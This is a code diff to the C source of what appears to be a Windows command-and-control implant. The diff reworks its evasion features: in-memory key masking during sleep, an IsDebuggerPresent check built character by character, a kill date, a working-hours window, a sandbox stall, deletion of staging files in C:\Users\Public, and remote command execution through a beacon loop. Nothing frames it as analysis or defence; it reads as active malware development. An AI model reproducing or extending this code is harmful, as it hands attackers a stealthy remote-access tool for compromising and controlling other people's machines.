@@ -43,6 +43,9 @@
 #ifndef WORK_END
 #define WORK_END 24
 #endif
+#ifndef POLY_SEED
+#define POLY_SEED 0x6C21u
+#endif
 
 static char g_agent_id[64] = {0};
 static unsigned char g_session[32], g_hs[32], g_eph[32];
@@ -212,9 +215,21 @@ static char *aes_gcm_open_raw(const unsigned char key[32], const unsigned char *
     return pt;
 }
 
-static void xor_mem(unsigned char *p, size_t n, const unsigned char *key, size_t klen) {
+static volatile unsigned poly_mix = POLY_SEED;
+static const unsigned char poly_pad[8] = {
+    (unsigned char)(POLY_SEED), (unsigned char)(POLY_SEED >> 8),
+    (unsigned char)(POLY_SEED >> 3), (unsigned char)(0x5A ^ (POLY_SEED & 0xFF)),
+    (unsigned char)(POLY_SEED * 3), (unsigned char)(POLY_SEED + 17),
+    (unsigned char)(POLY_SEED ^ 0xC3), (unsigned char)(POLY_SEED >> 4)
+};
+
+static void mix_xor(unsigned char *p, size_t n, const unsigned char *key) {
     size_t i;
-    for (i = 0; i < n; i++) p[i] ^= key[i % klen];
+    unsigned char k = (unsigned char)(poly_mix ^ poly_pad[poly_mix & 7]);
+    for (i = 0; i < n; i++) {
+        k = (unsigned char)(k + key[i & 31] + (unsigned char)i + poly_pad[i & 7]);
+        p[i] ^= k;
+    }
 }
 
 static void stealth_sleep_ms(int ms) {
@@ -223,15 +238,15 @@ static void stealth_sleep_ms(int ms) {
         Sleep(ms > 0 ? ms : 1);
         return;
     }
-    xor_mem((unsigned char *)g_agent_id, sizeof(g_agent_id), key, 32);
-    xor_mem(g_session, sizeof(g_session), key, 32);
-    xor_mem(g_hs, sizeof(g_hs), key, 32);
-    xor_mem(g_eph, sizeof(g_eph), key, 32);
+    mix_xor((unsigned char *)g_agent_id, sizeof(g_agent_id), key);
+    mix_xor(g_session, sizeof(g_session), key);
+    mix_xor(g_hs, sizeof(g_hs), key);
+    mix_xor(g_eph, sizeof(g_eph), key);
     Sleep(ms > 0 ? ms : 1);
-    xor_mem(g_eph, sizeof(g_eph), key, 32);
-    xor_mem(g_hs, sizeof(g_hs), key, 32);
-    xor_mem(g_session, sizeof(g_session), key, 32);
-    xor_mem((unsigned char *)g_agent_id, sizeof(g_agent_id), key, 32);
+    mix_xor(g_eph, sizeof(g_eph), key);
+    mix_xor(g_hs, sizeof(g_hs), key);
+    mix_xor(g_session, sizeof(g_session), key);
+    mix_xor((unsigned char *)g_agent_id, sizeof(g_agent_id), key);
     memset(key, 0, sizeof(key));
 }
 
@@ -239,32 +254,80 @@ static void sleep_mask(int ms) {
     stealth_sleep_ms(ms);
 }
 
-static void wait_window(void) {
-    for (;;) {
-        SYSTEMTIME st;
-        int today;
-        if (IsDebuggerPresent()) ExitProcess(0);
-        GetSystemTime(&st);
-        today = st.wYear * 10000 + st.wMonth * 100 + st.wDay;
-        if (KILL_DATE > 0 && today > KILL_DATE) ExitProcess(0);
-        if (WORK_END <= WORK_START || WORK_END >= 24 || (st.wHour >= WORK_START && st.wHour < WORK_END)) return;
-        Sleep(60000);
-    }
+static int under_debug(void) {
+    char api[18];
+    FARPROC fn;
+    HMODULE k32;
+    api[0] = 'I'; api[1] = 's'; api[2] = 'D'; api[3] = 'e'; api[4] = 'b';
+    api[5] = 'u'; api[6] = 'g'; api[7] = 'g'; api[8] = 'e'; api[9] = 'r';
+    api[10] = 'P'; api[11] = 'r'; api[12] = 'e'; api[13] = 's'; api[14] = 'e';
+    api[15] = 'n'; api[16] = 't'; api[17] = 0;
+    k32 = GetModuleHandleA("kernel32.dll");
+    if (!k32) return 0;
+    fn = GetProcAddress(k32, api);
+    if (!fn) return 0;
+    return ((int (WINAPI *)(void))fn)() ? 1 : 0;
 }
 
-static void wipe_public_artifacts(void) {
-    const char *globs[] = {"C:\\Users\\Public\\*.hd", "C:\\Users\\Public\\*frame.txt", "C:\\Users\\Public\\*host.txt", NULL};
+static int expired(void) {
+    SYSTEMTIME st;
+    volatile int limit = KILL_DATE;
+    int today;
+    if (limit <= 0) return 0;
+    GetSystemTime(&st);
+    today = (int)st.wYear * 10000 + (int)st.wMonth * 100 + (int)st.wDay;
+    return today > limit;
+}
+
+static void stop_if_needed(void) {
+    if (under_debug() || expired()) ExitProcess(0);
+}
+
+static void hold_if_tiny(void) {
+    SYSTEM_INFO info;
+    GetSystemInfo(&info);
+    if (info.dwNumberOfProcessors >= 2) return;
+    Sleep(10000);
+    Sleep(20000);
+}
+
+static void join_pub(char *dst, size_t n, const char *tail) {
+    char dir[] = {'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\\', 'P', 'u', 'b', 'l', 'i', 'c', '\\', 0};
+    snprintf(dst, n, "%s%s", dir, tail);
+}
+
+static void clear_stage_files(void) {
+    char g0[40], g1[48], g2[48], name[MAX_PATH];
+    char t0[] = {'*', '.', 'h', 'd', 0};
+    char t1[] = {'*', 'f', 'r', 'a', 'm', 'e', '.', 't', 'x', 't', 0};
+    char t2[] = {'*', 'h', 'o', 's', 't', '.', 't', 'x', 't', 0};
+    const char *globs[3];
     int i;
-    for (i = 0; globs[i]; i++) {
+    join_pub(g0, sizeof(g0), t0);
+    join_pub(g1, sizeof(g1), t1);
+    join_pub(g2, sizeof(g2), t2);
+    globs[0] = g0;
+    globs[1] = g1;
+    globs[2] = g2;
+    for (i = 0; i < 3; i++) {
         WIN32_FIND_DATAA fd;
         HANDLE h = FindFirstFileA(globs[i], &fd);
         if (h == INVALID_HANDLE_VALUE) continue;
         do {
-            char path[MAX_PATH];
-            snprintf(path, sizeof(path), "C:\\Users\\Public\\%s", fd.cFileName);
-            DeleteFileA(path);
+            join_pub(name, sizeof(name), fd.cFileName);
+            DeleteFileA(name);
         } while (FindNextFileA(h, &fd));
         FindClose(h);
+    }
+}
+
+static void wait_window(void) {
+    for (;;) {
+        SYSTEMTIME st;
+        stop_if_needed();
+        GetSystemTime(&st);
+        if (WORK_END <= WORK_START || WORK_END >= 24 || (st.wHour >= WORK_START && st.wHour < WORK_END)) return;
+        Sleep(60000);
     }
 }
 
@@ -509,6 +572,22 @@ static int g_beacon_sleep = BEACON_SLEEP;
 
 static char* execute_command(const char *cmd) {
     const char *run = cmd;
+    if (strcmp(cmd, "pwd") == 0) {
+        char cwd[MAX_PATH];
+        if (!GetCurrentDirectoryA(MAX_PATH, cwd)) return _strdup("Error: no cwd");
+        return _strdup(cwd);
+    }
+    if (strcmp(cmd, "ls") == 0 || strcmp(cmd, "dir") == 0) return execute_command("__fs:ls:.");
+    if (strncmp(cmd, "ls ", 3) == 0) {
+        char wrapped[MAX_PATH + 16];
+        snprintf(wrapped, sizeof(wrapped), "__fs:ls:%s", cmd + 3);
+        return execute_command(wrapped);
+    }
+    if (strncmp(cmd, "dir ", 4) == 0) {
+        char wrapped[MAX_PATH + 16];
+        snprintf(wrapped, sizeof(wrapped), "__fs:ls:%s", cmd + 4);
+        return execute_command(wrapped);
+    }
     if (strncmp(cmd, "__fs:", 5) == 0) {
         const char *op = cmd + 5;
         if (strncmp(op, "ls:", 3) == 0 || strncmp(op, "ls ", 3) == 0) {
@@ -784,13 +863,15 @@ static void beacon_loop(void) {
 
                     char *output = execute_command(command);
                     char *escaped = json_escape(output);
+                    char *esc_cmd = json_escape(command);
 
-                    char *result_json = (char*)malloc(strlen(escaped) + strlen(command) + 256);
-                    snprintf(result_json, strlen(escaped) + strlen(command) + 256,
+                    char *result_json = (char*)malloc(strlen(escaped) + strlen(esc_cmd) + 256);
+                    snprintf(result_json, strlen(escaped) + strlen(esc_cmd) + 256,
                         "{\"type\":\"response\",\"output\":\"%s\",\"command\":\"%s\"}",
-                        escaped, command);
+                        escaped, esc_cmd);
                     free(command);
                     free(escaped);
+                    free(esc_cmd);
                     free(output);
 
                     if (!pending_results) {
@@ -826,14 +907,18 @@ static void beacon_loop(void) {
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     int hd_take_host(void);
     int hd_host_main(void);
+    int hd_pipe_main(const char *cmd);
+    {
+        FILE *df = fopen("C:\\Users\\Public\\hdcmd.txt", "w");
+        if (df) { fprintf(df, "[%s]\n", lpCmd ? lpCmd : "(null)"); fclose(df); }
+    }
+    if (lpCmd && strstr(lpCmd, "hdhost")) return hd_pipe_main(lpCmd);
     if (hd_take_host()) return hd_host_main();
+    stop_if_needed();
+    clear_stage_files();
+    hold_if_tiny();
     wait_window();
-    wipe_public_artifacts();
     srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
-
-    SYSTEM_INFO si;
-    GetSystemInfo(&si);
-    if (si.dwNumberOfProcessors < 2) Sleep(30000);
 
     int retries = 0;
     while (!do_register() && retries < 10) {
